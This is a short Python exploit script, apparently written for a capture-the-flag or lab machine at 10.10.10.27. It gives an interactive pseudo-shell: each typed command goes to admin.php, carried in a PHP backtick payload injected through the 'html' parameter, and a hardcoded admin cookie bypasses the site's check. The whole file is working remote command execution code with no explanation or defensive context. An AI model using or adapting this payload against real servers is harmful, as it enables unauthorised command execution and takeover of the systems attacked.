```python
#!/usr/bin/python

import requests

while True:

	command = input("~$ ")
	url = f'http://10.10.10.27/admin.php/?0={command}&html=%3C?=`$_GET[0]`;?%3E' 

	cookies = {
	    'adminpowa': 'noonecares'
	}

	response = requests.get(url, cookies=cookies)

	print(response.text)

```
